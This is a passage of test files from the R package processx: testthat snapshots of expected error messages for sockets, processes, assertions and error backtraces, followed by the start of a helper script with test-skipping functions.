      Caused by error in `chain_call(c_processx_connection_read_chars, con, n)` at connections.R:318:<col>:
      ! Cannot read from processx connection (system error 22, Invalid argument) @processx-connection.c:1940 (processx__connection_read)

# errors

    Code
      conn_create_unix_socket(sock)
    Condition
      Error in `conn_create_unix_socket()`:
      ! ! Native call to `processx_connection_create_socket` failed
      Caused by error in `chain_call(c_processx_connection_create_socket, filename, encoding)` at connections.R:634:<col>:
      ! Server socket path too long: <tempdir>/<tempfile>
    Code
      conn_create_unix_socket("/dev/null")
    Condition
      Error in `conn_create_unix_socket()`:
      ! ! Native call to `processx_connection_create_socket` failed
      Caused by error in `chain_call(c_processx_connection_create_socket, filename, encoding)` at connections.R:634:<col>:
      ! Cannot bind to socket (system error 98, Address already in use) @processx-connection.c:479 (processx_connection_create_socket)
    Code
      conn_connect_unix_socket("/dev/null")
    Condition
      Error in `conn_connect_unix_socket()`:
      ! ! Native call to `processx_connection_connect_socket` failed
      Caused by error in `chain_call(c_processx_connection_connect_socket, filename, encoding)` at connections.R:656:<col>:
      ! Cannot connect to socket (system error 111, Connection refused) @processx-connection.c:550 (processx_connection_connect_socket)
````

### `px390/processx/tests/testthat/_snaps/Windows/process.md`

````text
# non existing process

    Code
      process$new(tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! Command '<tempdir>/<tempfile>' not found @win/processx.c:1059 (processx_exec)

# working directory does not exist

    Code
      process$new(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! create process '<path>/px' (system error 267, The directory name is invalid.
      ) @win/processx.c:1370 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Windows/run.md`

````text
# working directory does not exist

    Code
      run(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! create process '<path>/px' (system error 267, The directory name is invalid.
      ) @win/processx.c:1370 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Windows/unix-sockets.md`

````text
# reading unaccepted server socket is error

    Code
      conn_read_chars(sock1)
    Condition
      Error in `processx_conn_read_chars()`:
      ! ! Native call to `processx_connection_read_chars` failed
      Caused by error in `chain_call(c_processx_connection_read_chars, con, n)` at connections.R:318:<col>:
      ! Cannot read from an un-accepted socket connection @processx-connection.c:1829 (processx__connection_read)
````

### `px390/processx/tests/testthat/_snaps/assertions.md`

````text
# is_string

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

---

    Code
      assert_that(is_string(n))
    Condition
      Error:
      ! ! n is not a string (length 1 character)

# is_string_or_null

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

---

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

---

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

---

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

---

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

---

    Code
      assert_that(is_string_or_null(n))
    Condition
      Error:
      ! ! n must be a string (length 1 character) or NULL

# is_flag

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

---

    Code
      assert_that(is_flag(n))
    Condition
      Error:
      ! ! n is not a flag (length 1 logical)

# is_integerish_scalar

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

---

    Code
      assert_that(is_integerish_scalar(n))
    Condition
      Error:
      ! ! n is not a length 1 integer

# is_pid

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

---

    Code
      assert_that(is_pid(n))
    Condition
      Error:
      ! ! n is not a process id (length 1 integer)

# is_flag_or_string

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

---

    Code
      assert_that(is_flag_or_string(n))
    Condition
      Error:
      ! ! n is not a flag or a string

# is_existing_file

    Code
      assert_that(is_existing_file(tempfile()))
    Condition
      Error:
      ! ! File tempfile() does not exist
````

### `px390/processx/tests/testthat/_snaps/err-output.md`

````text
# simple error

    Code
      cat(out$stderr)
    Output
      Error in `f()` at script.R:3:5:
      ! This failed
      ---
      Backtrace:
      1. base::source("script.R")
      2. | base::withVisible(eval(ei, envir))
      3. | base::eval(ei, envir)
      4. | base::eval(ei, envir)
      5. global f() at script.R:3:5
      6. processx:::throw("This failed") at script.R:2:10
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `f()` at script.R:4:5:
      ! This failed
      Type .Last.error to see the more details.

# simple error with cli

    Code
      cat(out$stderr)
    Output
      Error in `f()` at script.R:4:5:
      ! This failed
      ---
      Backtrace:
      1. base::source("script.R")
      2. | base::withVisible(eval(ei, envir))
      3. | base::eval(ei, envir)
      4. | base::eval(ei, envir)
      5. global f() at script.R:4:5
      6. processx:::throw("This failed") at script.R:3:10
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `f()` at script.R:5:5:
      ! This failed
      Type .Last.error to see the more details.

# chain_error

    Code
      cat(out$stderr)
    Output
      Error in `do()` at script.R:14:10:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:10:9:
      ! something is wrong here
      Caused by error in `do3()` at script.R:7:9:
      ! because of this
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. global f() at script.R:15:5
       6. global g() at script.R:12:10
       7. global h() at script.R:13:10
       8. global do() at script.R:14:10
       9. processx:::chain_error(do2(), "Failed to base64 encode") at script.R:10:9
      10. | base::withCallingHandlers(...)
      11. global do2()
      12. processx:::chain_error(do3(), "something is wrong here") at script.R:7:9
      13. | base::withCallingHandlers(...)
      14. global do3()
      15. processx:::throw("because of this") at script.R:4:9
      16. | base::signalCondition(cond)
      17. | (function (e)
      18. | processx:::throw_error(err, parent = e)
      19. | base::signalCondition(cond)
      20. | (function (e)
      21. | processx:::throw_error(err, parent = e)
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `do()` at script.R:16:14:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:12:13:
      ! something is wrong here
      Caused by error in `do3()` at script.R:9:13:
      ! because of this
      Type .Last.error to see the more details.

---

    Code
      cat(out$stderr)
    Output
      Error in `do()` at script.R:16:14:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:12:13:
      ! something is wrong here
      Caused by error in `do3()` at script.R:9:13:
      ! because of this
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. global f() at script.R:17:9
       6. global g() at script.R:14:14
       7. global h() at script.R:15:14
       8. global do() at script.R:16:14
       9. processx:::chain_error(do2(), "Failed to base64 encode") at script.R:12:13
      10. | base::withCallingHandlers(...)
      11. global do2()
      12. processx:::chain_error(do3(), "something is wrong here") at script.R:9:13
      13. | base::withCallingHandlers(...)
      14. global do3()
      15. processx:::throw("because of this") at script.R:6:13
      16. | base::signalCondition(cond)
      17. | (function (e) ...
      18. | processx:::throw_error(err, parent = e)
      19. | base::signalCondition(cond)
      20. | (function (e) ...
      21. | processx:::throw_error(err, parent = e)
      Execution halted

# chain_error with stop()

    Code
      cat(out$stderr)
    Output
      Error in `do()` at script.R:13:10:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:9:9:
      ! something is wrong here
      Caused by error in `do3()` at script.R:6:9:
      ! because of this
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. global f() at script.R:14:5
       6. global g() at script.R:11:10
       7. global h() at script.R:12:10
       8. global do() at script.R:13:10
       9. processx:::chain_error(do2(), "Failed to base64 encode") at script.R:9:9
      10. | base::withCallingHandlers(...)
      11. global do2()
      12. processx:::chain_error(do3(), "something is wrong here") at script.R:6:9
      13. | base::withCallingHandlers(...)
      14. global do3()
      15. base::stop("because of this") at script.R:3:9
      16. | base::.handleSimpleError(...)
      17. | local h(simpleError(msg, call))
      18. | processx:::throw_error(err, parent = e)
      19. | base::signalCondition(cond)
      20. | (function (e)
      21. | processx:::throw_error(err, parent = e)
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `do()` at script.R:15:14:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:11:13:
      ! something is wrong here
      Caused by error in `do3()` at script.R:8:13:
      ! because of this
      Type .Last.error to see the more details.

# chain_error with rlang::abort()

    Code
      cat(out$stderr)
    Output
      Error in `do()` at script.R:14:10:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:10:9:
      ! something is wrong here
      Caused by error in `do3()` at script.R:7:9:
      ! because of this
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. global f() at script.R:15:5
       6. global g() at script.R:12:10
       7. global h() at script.R:13:10
       8. global do() at script.R:14:10
       9. processx:::chain_error(do2(), "Failed to base64 encode") at script.R:10:9
      10. | base::withCallingHandlers(...)
      11. global do2()
      12. processx:::chain_error(do3(), "something is wrong here") at script.R:7:9
      13. | base::withCallingHandlers(...)
      14. global do3()
      15. rlang::abort("because of this") at script.R:4:9
      16. | rlang:::signal_abort(cnd, .file)
      17. | base::signalCondition(cnd)
      18. | (function (e) ...
      19. | processx:::throw_error(err, parent = e)
      20. | base::signalCondition(cond)
      21. | (function (e) ...
      22. | processx:::throw_error(err, parent = e)
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `do()` at script.R:16:14:
      ! Failed to base64 encode
      Caused by error in `do2()` at script.R:12:13:
      ! something is wrong here
      Caused by error in `do3()` at script.R:9:13:
      ! because of this
      Type .Last.error to see the more details.

# full parent error is printed in non-interactive mode

    Code
      cat(out$stderr)
    Output
      Error in `eval(ei, envir)`:
      ! failed to run external program
      Caused by error in `processx::run(px, c("return", "1"))` at script.R:4:5:
      ! System command 'px' failed
      ---
      Exit status: 1
      Stderr: <empty>
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. processx:::chain_error(processx::run(px, c("return", "1")), "failed to run  at script.R:4:5
       6. | base::withCallingHandlers(...)
       7. processx::run(px, c("return", "1"))
       8. processx:::throw(...)
       9. | base::signalCondition(cond)
      10. | (function (e)
      11. | processx:::throw_error(err, parent = e)
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      Error in `eval(ei, envir)`:
      ! failed to run external program
      Caused by error in `processx::run(px, c("return", "1"))` at script.R:6:9:
      ! System command 'px' failed
      Type .Last.error to see the more details.

---

    Code
      cat(out$stderr)
    Output
      Error in `eval(ei, envir)`:
      ! failed to run external program
      Caused by error in `processx::run(px, c("return", "1"))` at script.R:6:9:
      ! System command 'px' failed
      ---
      Exit status: 1
      Stderr: <empty>
      ---
      Backtrace:
       1. base::source("script.R")
       2. | base::withVisible(eval(ei, envir))
       3. | base::eval(ei, envir)
       4. | base::eval(ei, envir)
       5. processx:::chain_error(processx::run(px, c("return", "1")), "failed to r... at script.R:6:9
       6. | base::withCallingHandlers(...)
       7. processx::run(px, c("return", "1"))
       8. processx:::throw(...)
       9. | base::signalCondition(cond)
      10. | (function (e) ...
      11. | processx:::throw_error(err, parent = e)
      Execution halted
````

### `px390/processx/tests/testthat/_snaps/errors.md`

````text
# output from error

    Code
      cat(out$stderr)
    Output
      Error in `processx::run(...)` at script.R:2:5:
      ! System command 'px' failed
      ---
      Exit status: 100
      Stderr:
      1
      2
      3
      4
      5
      6
      7
      8
      9
      10
      11
      12
      13
      14
      15
      16
      17
      18
      19
      20
      ---
      Backtrace:
      1. base::source("script.R")
      2. | base::withVisible(eval(ei, envir))
      3. | base::eval(ei, envir)
      4. | base::eval(ei, envir)
      5. processx::run(...) at script.R:2:5
      6. processx:::throw(...)
      Execution halted
````

### `px390/processx/tests/testthat/_snaps/fifo.md`

````text
# errors

    Code
      conn_create_fifo(read = TRUE, write = TRUE)
    Condition
      Error in `conn_create_fifo()`:
      ! ! Bi-directional FIFOs are not supported currently

---

    Code
      conn_connect_fifo(read = TRUE, write = TRUE)
    Condition
      Error in `conn_connect_fifo()`:
      ! ! Bi-directional FIFOs are not supported currently
````

### `px390/processx/tests/testthat/_snaps/io.md`

````text
# Output and error are discarded by default

    Code
      p$read_output_lines(n = 1)
    Condition
      Error in `process_get_output_connection()`:
      ! ! stdout is not a pipe.
    Code
      p$read_all_output_lines()
    Condition
      Error in `process_get_output_connection()`:
      ! ! stdout is not a pipe.
    Code
      p$read_all_output()
    Condition
      Error in `process_get_output_connection()`:
      ! ! stdout is not a pipe.
    Code
      p$read_error_lines(n = 1)
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.
    Code
      p$read_all_error_lines()
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.
    Code
      p$read_all_error()
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.

# same pipe

    Code
      p$read_all_error_lines()
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.

# same file

    Code
      p$read_all_output_lines()
    Condition
      Error in `process_get_output_connection()`:
      ! ! stdout is not a pipe.

---

    Code
      p$read_all_error_lines()
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.

# same NULL, for completeness

    Code
      p$read_all_output_lines()
    Condition
      Error in `process_get_output_connection()`:
      ! ! stdout is not a pipe.

---

    Code
      p$read_all_error_lines()
    Condition
      Error in `process_get_error_connection()`:
      ! ! stderr is not a pipe.
````

### `px390/processx/tests/testthat/_snaps/newcli/err-output.md`

````text
# simple error with cli and colors

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `f()`[90m at script.R:5:5[39m:
      [33m![39m This failed
      ---
      Backtrace:
      [90m1. [39mbase::[1msource[22m[38;5;178m([38;5;37m"script.R"[38;5;178m)[39m
      [90m2. | base::withVisible(eval(ei, envir))[39m
      [90m3. | base::eval(ei, envir)[39m
      [90m4. | base::eval(ei, envir)[39m
      [90m5. [39mglobal [1mf[22m[38;5;178m()[39m[90m at script.R:5:5[39m
      [90m6. [39mprocessx:::[1mthrow[22m[38;5;178m([38;5;37m"This failed"[38;5;178m)[39m[90m at script.R:4:10[39m
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      [1m[33mError[39m[22m in `f()`[90m at script.R:6:5[39m:
      [33m![39m This failed
      [90mType .Last.error to see the more details.[39m

# chain_error

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `do()`[90m at script.R:19:14[39m:
      [33m![39m Failed to base64 encode
      [1mCaused by error[22m in `do2()`[90m at script.R:15:13[39m:
      [33m![39m something is wrong here
      [1mCaused by error[22m in `do3()`[90m at script.R:12:13[39m:
      [33m![39m because of this
      ---
      Backtrace:
      [90m 1. [39mbase::[1msource[22m[38;5;178m([38;5;37m"script.R"[38;5;178m)[39m
      [90m 2. | base::withVisible(eval(ei, envir))[39m
      [90m 3. | base::eval(ei, envir)[39m
      [90m 4. | base::eval(ei, envir)[39m
      [90m 5. [39mglobal [1mf[22m[38;5;178m()[39m[90m at script.R:20:9[39m
      [90m 6. [39mglobal [1mg[22m[38;5;178m()[39m[90m at script.R:17:14[39m
      [90m 7. [39mglobal [1mh[22m[38;5;178m()[39m[90m at script.R:18:14[39m
      [90m 8. [39mglobal [1mdo[22m[38;5;178m()[39m[90m at script.R:19:14[39m
      [90m 9. [39mprocessx:::[1mchain_error[22m[38;5;178m([39m[1mdo2[22m[33m()[39m, [38;5;37m"Failed to base64 encode"[38;5;178m)[39m[90m at script.R:15:13[39m
      [90m10. | base::withCallingHandlers(...)[39m
      [90m11. [39mglobal [1mdo2[22m[38;5;178m()[39m
      [90m12. [39mprocessx:::[1mchain_error[22m[38;5;178m([39m[1mdo3[22m[33m()[39m, [38;5;37m"something is wrong here"[38;5;178m)[39m[90m at script.R:12:13[39m
      [90m13. | base::withCallingHandlers(...)[39m
      [90m14. [39mglobal [1mdo3[22m[38;5;178m()[39m
      [90m15. [39mprocessx:::[1mthrow[22m[38;5;178m([38;5;37m"because of this"[38;5;178m)[39m[90m at script.R:9:13[39m
      [90m16. | base::signalCondition(cond)[39m
      [90m17. | (function (e) ...[39m
      [90m18. | processx:::throw_error(err, parent = e)[39m
      [90m19. | base::signalCondition(cond)[39m
      [90m20. | (function (e) ...[39m
      [90m21. | processx:::throw_error(err, parent = e)[39m
      Execution halted

# full parent error is printed in non-interactive mode

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `eval(ei, envir)`:
      [33m![39m failed to run external program
      [1mCaused by error[22m in `processx::run(px, c("return", "1"))`[90m at script.R:9:9[39m:
      [33m![39m System command 'px' failed
      ---
      Exit status: 1
      Stderr: <empty>
      ---
      Backtrace:
      [90m 1. [39mbase::[1msource[22m[38;5;178m([38;5;37m"script.R"[38;5;178m)[39m
      [90m 2. | base::withVisible(eval(ei, envir))[39m
      [90m 3. | base::eval(ei, envir)[39m
      [90m 4. | base::eval(ei, envir)[39m
      [90m 5. [39mprocessx:::[1mchain_error[22m[38;5;178m([39mprocessx::[1mrun[22m[33m([39mpx, [1mc[22m[34m([39m[38;5;37m"return"[39m, [38;5;37m"1"[39m[34m)[39m[33m)[39m, [38;5;37m"failed to r[39m...[90m at script.R:9:9[39m
      [90m 6. | base::withCallingHandlers(...)[39m
      [90m 7. [39mprocessx::[1mrun[22m[38;5;178m([39mpx, [1mc[22m[33m([39m[38;5;37m"return"[39m, [38;5;37m"1"[39m[33m)[39m[38;5;178m)[39m
      [90m 8. [39mprocessx:::[1mthrow[22m[38;5;178m([39m...[38;5;178m)[39m
      [90m 9. | base::signalCondition(cond)[39m
      [90m10. | (function (e) ...[39m
      [90m11. | processx:::throw_error(err, parent = e)[39m
      Execution halted
````

### `px390/processx/tests/testthat/_snaps/oldcli/err-output.md`

````text
# simple error with cli and colors

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `f()`[90m at script.R:5:5[39m:
      [33m![39m This failed
      ---
      Backtrace:
      [90m1. [39mbase::[36msource[39m[33m("script.R")[39m
      [90m2. | base::withVisible(eval(ei, envir))[39m
      [90m3. | base::eval(ei, envir)[39m
      [90m4. | base::eval(ei, envir)[39m
      [90m5. [39mglobal [36mf[39m[33m()[39m[90m at script.R:5:5[39m
      [90m6. [39mprocessx:::[36mthrow[39m[33m("This failed")[39m[90m at script.R:4:10[39m
      Execution halted

---

    Code
      cat(out$stdout)
    Output
      [1m[33mError[39m[22m in `f()`[90m at script.R:6:5[39m:
      [33m![39m This failed
      [90mType .Last.error to see the more details.[39m

# chain_error

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `do()`[90m at script.R:19:14[39m:
      [33m![39m Failed to base64 encode
      [1mCaused by error[22m in `do2()`[90m at script.R:15:13[39m:
      [33m![39m something is wrong here
      [1mCaused by error[22m in `do3()`[90m at script.R:12:13[39m:
      [33m![39m because of this
      ---
      Backtrace:
      [90m 1. [39mbase::[36msource[39m[33m("script.R")[39m
      [90m 2. | base::withVisible(eval(ei, envir))[39m
      [90m 3. | base::eval(ei, envir)[39m
      [90m 4. | base::eval(ei, envir)[39m
      [90m 5. [39mglobal [36mf[39m[33m()[39m[90m at script.R:20:9[39m
      [90m 6. [39mglobal [36mg[39m[33m()[39m[90m at script.R:17:14[39m
      [90m 7. [39mglobal [36mh[39m[33m()[39m[90m at script.R:18:14[39m
      [90m 8. [39mglobal [36mdo[39m[33m()[39m[90m at script.R:19:14[39m
      [90m 9. [39mprocessx:::[36mchain_error[39m[33m([39m[36mdo2[39m[34m()[39m, [33m"Failed to base64 encode")[39m[90m at script.R:15:13[39m
      [90m10. | base::withCallingHandlers({ ...[39m
      [90m11. [39mglobal [36mdo2[39m[33m()[39m
      [90m12. [39mprocessx:::[36mchain_error[39m[33m([39m[36mdo3[39m[34m()[39m, [33m"something is wrong here")[39m[90m at script.R:12:13[39m
      [90m13. | base::withCallingHandlers({ ...[39m
      [90m14. [39mglobal [36mdo3[39m[33m()[39m
      [90m15. [39mprocessx:::[36mthrow[39m[33m("because of this")[39m[90m at script.R:9:13[39m
      [90m16. | base::signalCondition(cond)[39m
      [90m17. | (function (e) ...[39m
      [90m18. | processx:::throw_error(err, parent = e)[39m
      [90m19. | base::signalCondition(cond)[39m
      [90m20. | (function (e) ...[39m
      [90m21. | processx:::throw_error(err, parent = e)[39m
      Execution halted

# full parent error is printed in non-interactive mode

    Code
      cat(out$stderr)
    Output
      [1m[33mError[39m[22m in `eval(ei, envir)`:
      [33m![39m failed to run external program
      [1mCaused by error[22m in `processx::run(px, c("return", "1"))`[90m at script.R:9:9[39m:
      [33m![39m System command 'px' failed
      ---
      Exit status: 1
      Stderr: <empty>
      ---
      Backtrace:
      [90m 1. [39mbase::[36msource[39m[33m("script.R")[39m
      [90m 2. | base::withVisible(eval(ei, envir))[39m
      [90m 3. | base::eval(ei, envir)[39m
      [90m 4. | base::eval(ei, envir)[39m
      [90m 5. [39mprocessx:::[36mchain_error[39m[33m([39mprocessx::[36mrun[39m[34m([39mpx, [36mc([39m[33m"return"[39m, [33m"1"[39m[36m)[39m[34m)[39m, [33m"failed to r[39m...[90m at script.R:9:9[39m
      [90m 6. | base::withCallingHandlers({ ...[39m
      [90m 7. [39mprocessx::[36mrun[39m[33m([39mpx, [36mc[39m[34m([39m[33m"return"[39m, [33m"1"[39m[34m)[39m[33m)[39m
      [90m 8. [39mprocessx:::throw(new_process_error(res, call = sys.call(), echo = echo, ...
      [90m 9. | base::signalCondition(cond)[39m
      [90m10. | (function (e) ...[39m
      [90m11. | processx:::throw_error(err, parent = e)[39m
      Execution halted
````

### `px390/processx/tests/testthat/_snaps/process.md`

````text
# post processing

    Code
      p$get_result()
    Condition
      Error in `process_get_result()`:
      ! ! Process is still alive
````

### `px390/processx/tests/testthat/_snaps/pty.md`

````text
# read_output_lines() fails for pty

    Code
      p$read_output_lines()
    Condition
      Error in `process_read_output_lines()`:
      ! ! Cannot read lines from a pty (see manual)
````

### `px390/processx/tests/testthat/_snaps/run.md`

````text
# binary=TRUE errors with line callbacks

    Code
      run(px, "out", encoding = "binary", stdout_line_callback = function(x, ...) x)
    Condition
      Error in `run()`:
      ! ! `stdout_line_callback` cannot be used with `encoding = "binary"`

---

    Code
      run(px, "out", encoding = "binary", stderr_line_callback = function(x, ...) x)
    Condition
      Error in `run()`:
      ! ! `stderr_line_callback` cannot be used with `encoding = "binary"`

# pty=TRUE errors on incompatible arguments

    Code
      run("echo", pty = TRUE, stdout = NULL)
    Condition
      Error in `run()`:
      ! ! `stdout` must be `"|"` (the default) if `pty = TRUE`

---

    Code
      run("echo", pty = TRUE, stderr = NULL)
    Condition
      Error in `run()`:
      ! ! `stderr` must be `"|"` (the default) if `pty = TRUE`

---

    Code
      run("echo", pty = TRUE, stderr_to_stdout = TRUE)
    Condition
      Error in `run()`:
      ! ! `stderr_to_stdout` must be `FALSE` if `pty = TRUE`

---

    Code
      run("echo", pty = TRUE, stderr_callback = function(x, ...) x)
    Condition
      Error in `run()`:
      ! ! `stderr_callback` cannot be used with `pty = TRUE`

---

    Code
      run("echo", pty = TRUE, stderr_line_callback = function(x, ...) x)
    Condition
      Error in `run()`:
      ! ! `stderr_line_callback` cannot be used with `pty = TRUE`

---

    Code
      run("echo", pty = TRUE, stdin = "|")
    Condition
      Error in `run()`:
      ! ! When `pty = TRUE`, `stdin` must be `NULL` or a file path
````

### `px390/processx/tests/testthat/_snaps/standalone-errors.md`

````text
# can pass frame as error call in `new_error()`

    Code
      f()
    Condition
      Error in `f()`:
      ! ! my message
    Code
      g()
    Condition
      Error in `g()`:
      ! ! my message

# can pass frame as error call in `throw()`

    Code
      f()
    Condition
      Error in `f()`:
      ! ! my message
    Code
      g()
    Condition
      Error in `g()`:
      ! ! my message
````

### `px390/processx/tests/testthat/_snaps/unix-sockets.md`

````text
# CRUD

    Code
      conn_accept_unix_socket(sock1)
    Condition
      Error in `conn_accept_unix_socket()`:
      ! ! Native call to `processx_connection_accept_socket` failed
      Caused by error in `chain_call(c_processx_connection_accept_socket, con)` at connections.R:669:<col>:
      ! Socket is not listening @processx-connection.c:577 (processx_connection_accept_socket)

# writing unaccepted server socket is error

    Code
      conn_write(sock1, "Hello\n")
    Condition
      Error in `processx_conn_write()`:
      ! ! Native call to `processx_connection_write_bytes` failed
      Caused by error in `chain_call(c_processx_connection_write_bytes, con, str)` at connections.R:440:<col>:
      ! Cannot write to an un-accepted socket connection @processx-connection.c:1058 (processx_c_connection_write_bytes)

# errors

    Code
      conn_accept_unix_socket(ff)
    Condition
      Error in `conn_accept_unix_socket()`:
      ! ! Native call to `processx_connection_accept_socket` failed
      Caused by error in `chain_call(c_processx_connection_accept_socket, con)` at connections.R:669:<col>:
      ! Not a socket connection @processx-connection.c:573 (processx_connection_accept_socket)

---

    Code
      conn_unix_socket_state(ff)
    Condition
      Error in `conn_unix_socket_state()`:
      ! ! Native call to `processx_connection_socket_state` failed
      Caused by error in `chain_call(c_processx_connection_socket_state, con)` at connections.R:681:<col>:
      ! Not a socket connection @processx-connection.c:622 (processx_connection_socket_state)
````

### `px390/processx/tests/testthat/_snaps/utils.md`

````text
# full_path gives correct values, windows

    Code
      full_path("//")
    Condition
      Error in `full_path()`:
      ! ! Server name not found in network path.
    Code
      full_path("///")
    Condition
      Error in `full_path()`:
      ! ! Server name not found in network path.
    Code
      full_path("///a")
    Condition
      Error in `full_path()`:
      ! ! Server name not found in network path.
````

### `px390/processx/tests/testthat/fixtures/simple.txt`

````text
simple text file
````

### `px390/processx/tests/testthat/helper.R`

````r
skip_other_platforms <- function(platform) {
  if (os_type() != platform) skip(paste("only run it on", platform))
}

skip_if_no_tool <- function(tool) {
  if (Sys.which(tool) == "") skip(paste0("`", tool, "` is not available"))
}

skip_extra_tests <- function() {
  if (Sys.getenv("PROCESSX_EXTRA_TESTS") == "") skip("no extra tests")
}

skip_if_no_ps <- function() {
  if (!requireNamespace("ps", quietly = TRUE)) {
    skip("ps package needed")
  }
  if (!ps::ps_is_supported()) skip("ps does not support this platform")
}

skip_if_not_installed <- function(...) {
  if (Sys.getenv("_R_CHECK_FORCE_SUGGESTS_") == "false") {
    testthat::skip_if_not_installed(...)
  }
}

skip_if_no_srcrefs <- function() {
  if (
    !asNamespace("pkgload")$is_dev_package("processx") &&
      Sys.getenv("R_KEEP_PKG_SOURCE") != "yes"
  ) {
    testthat::skip("no srcrefs")
  }
}

try_silently <- function(expr) {
  tryCatch(
    expr,
